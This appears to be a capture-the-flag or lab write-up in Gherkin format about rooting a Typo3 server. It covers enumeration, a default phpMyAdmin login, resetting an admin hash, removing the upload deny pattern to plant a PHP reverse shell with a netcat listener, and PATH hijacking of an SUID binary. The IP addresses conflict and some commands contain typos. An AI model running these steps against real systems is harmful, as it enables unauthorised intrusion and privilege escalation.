## Version 1.4.1
## language: en

Feature:
  TOE:
    Typo3
  Category:
    Exec Code
  Location:
    182.168.0.16
  CWE:		
    CWE-521: Weak Password Requirements
  Rule:
    REQ.142 Change system default credentials
  Goal:
    Gain root access
  Recommendation:
    Update the version of CMS Typo3

  Background:
  Hacker's software:
    | <Software name> | <Version>   |
    | Kali Linux      | 2020.1      |
    | Firefox Quantum | 68.20esr    |
    | Nmap            | 7.80        |
    | Dirb            | 2.22        |
  TOE information:
    Given I'm accessing the server 192.168.0.27
    And the machine have a web service in the port 8080

  Scenario: Normal use case
    Given I'm scanning the server
    """
    $ nmap -sV 182.168.0.16
    """
    When I see the open ports
    """
    22/tcp   open  ssh     OpenSSH 7.9p1 Debian
    80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
    8000/tcp open  http    Apache httpd 2.4.38
    8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
    8081/tcp open  http    Apache httpd 2.4.38 ((Debian))
    """
    Then I decide go to service HTTP with the port 80

  Scenario: Static detection
    Given the vulnerability is unrelated to the code
    Then I can't perform a static detection

  Scenario: Dynamic detection
    Given I have a web service
    When I go to for nessus to perform a scan
    Then I see that there's nothing useful
    When I run "dirb" like this
    """
    dirb http://192.168.0.16:80
    """
    Then I generate several URLs
    And the most important one is this
    """
    http://192.168.0.16:80/typo3/
    """
    When I see that that URL is the login to the Typo3 CMS
    Then do this search
    """
    $ dirb http://192.168.0.16:8081
    """
    And the result was the URL of "phpmyadmin"
    """
    http://192.168.0.16:8081/phpmyadmin/index.php
    """

  Scenario: Exploitation
    Given I have the "phpmyadmin"
    When I use "root" as user and password is succesful
    Then I go to the "table" named "bd_user"
    And there are two users 
    When I decide to change the password because the one he has is this
    """
    $argon2id$v=19$m=65536,t=16,
    p=2$Q2E3NG1YeTE5NkkxSi5hMg$Hn5lqwQnbYjlnZMPahFHjEWhCDwOcbDKjg3RrTfrVuE
    """
    Then when I changed it and entered the CMS logind it didn't work
    And I search on internet what this "argon2" and it's an HASH generator
    When I generate a new hash with the word "admin"
    And by putting that word in the login it worked
    When I see that the CMS is made in php
    Then I decide to look for a section that allows me to upload files
    And it's to make a "shell reverse" in PHP
    When I uploaded the PHP file but it didn't accept it
    Then I search the internet and the CMS can block them in this way
    """
    [BE][fileDenyPattern] = \.(php[3-8]?|phpsh|phtml|pht|phar|shtml|
    """
    When I remove that restriction
    Then I use "Netcat" to open a 4545 port
    """
    $ nc -lvp 4545
    """
    And I used "Curl" to connect to the Netcat port using the "shell_reverse"
    """
    $ sudo curl -v http://192.168.0.16/filename/user.php
    """
    When I already have a "shell" but as a user "www-data"
    Then to lift privileges I started looking for "SUID" files
    """
    $ find / -type -f -perm -u=s 2>/dev/null
    """
    And there are several SUID files but they all ask for the root password
    And there is a file named "/usr/local/bin/apache2-restart"
    When I run the "apache2-restart" but it doesn't work
    Then I search the internet
    And the apache runs as "root" in the "PATH" variable
    Then with the command "cat" I see the code and it's all weird
    And I decide to use the "strings" command to see the most readable code
    """
    $ strings apache2-restart
    """
    When the code has a line to start the "apache2"
    Then that line runs as "root"
    And then what I can do is create a file with the "/bin/bash"
    """
    $ echo "/bin/bash" > privilages
    """
    When I have the file I'll set all the permissions
    Then we'll modify our "PATH" variable
    And we're going to modify it by placing the "privilages" file
    """
    $ export PATH=/tmp/:$PATH
    """
    When we can run the "apache2-restart" and we're already "root"
    Then to activate the "Prompt" we put this
    """
    # python3 -c 'import pty;pty.spawn("/bin/bash")'
    """

  Scenario: Remediation
    Given I have the "TYpo3 1.30.0"
    When I decide to search the Internet for a solution to remedy
    And I found that only upgrade to the most recent version

  Scenario: Scoring
    Severity scoring according to CVSSv3 standard
  Base: Attributes that are constants over time and organizations
    4.4/10 (medium) - AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L
  Temporal: Attributes that measure the exploit's popularity and fixability
    4.2/10 (medium) - E:X/RL:O/RC:X/CR:H/IR:H/AR:H
  Environmental: Unique and relevant attributes to a specific user environment
    4.4/10 (medium) - MAV:A/MAC:L/MPR:L/MUI:N/MS:U/MC:N/MI:L/MA:L

  Scenario: Correlations
    Given the version is no longer in use
    Then there is no correlation to date
